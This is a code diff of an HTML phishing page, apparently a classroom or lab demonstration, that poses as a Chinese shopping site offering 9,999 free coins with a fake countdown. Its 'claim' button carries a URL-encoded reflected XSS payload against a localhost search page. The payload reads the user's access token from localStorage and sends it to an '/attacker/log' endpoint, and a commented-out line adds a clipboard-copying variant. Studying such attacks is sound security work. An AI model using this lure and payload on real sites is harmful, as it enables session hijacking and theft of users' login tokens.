@@ -1,61 +1,102 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-TW">
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Claim Your Prize!</title>
-    <style>
-        body {
-            font-family: sans-serif;
-            text-align: center;
-            padding: 50px;
-            background-color: #f0f0f0;
-        }
-
-        .container {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-
-        h1 {
-            color: #d9534f;
-        }
-
-        a {
-            display: inline-block;
-            background: #0275d8;
-            color: white;
-            padding: 15px 25px;
-            text-decoration: none;
-            border-radius: 5px;
-            font-size: 1.2em;
-            margin-top: 20px;
-        }
-
-        a:hover {
-            background: #025aa5;
-        }
-    </style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>限時領取魚幣9999！</title>
+    <link rel="stylesheet" href="index.css" />
 </head>
 
 <body>
     <div class="container">
-        <h1>🎉 Congratulations! 🎉</h1>
-        <p>You have been selected to win a special prize.</p>
-        <p>Click the button below to claim it now!</p>
+        <div class="header">
+            <div class="logo">
+                <span>F</span>
+            </div>
+            <span class="brand-name">魚皮購物</span>
+        </div>
+
+        <div class="badge">🔥 限時優惠</div>
+
+        <h1>恭喜您獲得</h1>
+
+        <div class="coin-display">
+            <div class="coin-amount">9,999</div>
+            <div class="coin-label">魚幣</div>
+        </div>
+
+        <div class="countdown">
+            <div class="countdown-label">⏰ 剩餘時間</div>
+            <div class="countdown-timer">
+                <div class="time-unit">
+                    <span class="time-value" id="minutes">00</span>
+                    <span class="time-label">分</span>
+                </div>
+                <div class="time-unit">
+                    <span class="time-value" id="seconds">00</span>
+                    <span class="time-label">秒</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon">✓</div>
+                <span>立即領取</span>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">✓</div>
+                <span>全站可用</span>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">✓</div>
+                <span>限時優惠</span>
+            </div>
+        </div>
 
         <!-- 
         <img src=x onerror="var t=localStorage.getItem('access_token'); alert('YOUR TOKEN HAS BEEN STOLEN: '+t); new Image().src='http://localhost:3000/attacker/log?token='+t">
+        <img src=x onerror="var t = localStorage.getItem('access_token');navigator.clipboard.writeText(t);document.body.innerHTML += '<p>Token copied to clipboard</p>';">
         -->
 
         <!-- 使用 https://www.urlencoder.org/ 將內容 encoder 成url可以解析 功能跳轉到原本登入網站在alert 出當前 token-->
-        <a
-            href="http://localhost:5173/vulnerable?q=%20%20%20%20%20%20%20%20%3Cimg%20src%3Dx%20onerror%3D%22var%20t%3DlocalStorage.getItem%28%27access_token%27%29%3B%20alert%28%27YOUR%20TOKEN%20HAS%20BEEN%20STOLEN%3A%20%27%2Bt%29%3B%20new%20Image%28%29.src%3D%27http%3A%2F%2Flocalhost%3A3000%2Fattacker%2Flog%3Ftoken%3D%27%2Bt%22%3E">CLAIM
-            PRIZE NOW</a>
+
+        <a href="http://localhost:5173/search?q=%20%20%20%20%20%20%20%20%3Cimg%20src%3Dx%20onerror%3D%22var%20t%3DlocalStorage.getItem%28%27access_token%27%29%3B%20alert%28%27YOUR%20TOKEN%20HAS%20BEEN%20STOLEN%3A%20%27%2Bt%29%3B%20new%20Image%28%29.src%3D%27http%3A%2F%2Flocalhost%3A3000%2Fattacker%2Flog%3Ftoken%3D%27%2Bt%22%3E"
+            class="claim-button">
+            立即領取魚幣
+        </a>
+
+        <div class="limited-text">⚠️ 僅限前1000名用戶</div>
     </div>
+
+    <script>
+        // 倒計時功能（設定為5分鐘）
+        let totalSeconds = 5 * 60; // 5分鐘
+
+        function updateCountdown() {
+            const minutes = Math.floor(totalSeconds / 60);
+            const seconds = totalSeconds % 60;
+
+            document.getElementById("minutes").textContent = String(
+                minutes
+            ).padStart(2, "0");
+            document.getElementById("seconds").textContent = String(
+                seconds
+            ).padStart(2, "0");
+
+            if (totalSeconds > 0) {
+                totalSeconds--;
+            } else {
+                // 時間到後重新設定
+                totalSeconds = 5 * 60;
+            }
+        }
+
+        // 每秒更新一次
+        setInterval(updateCountdown, 1000);
+        updateCountdown(); // 立即執行一次
+    </script>
 </body>
 
 </html>
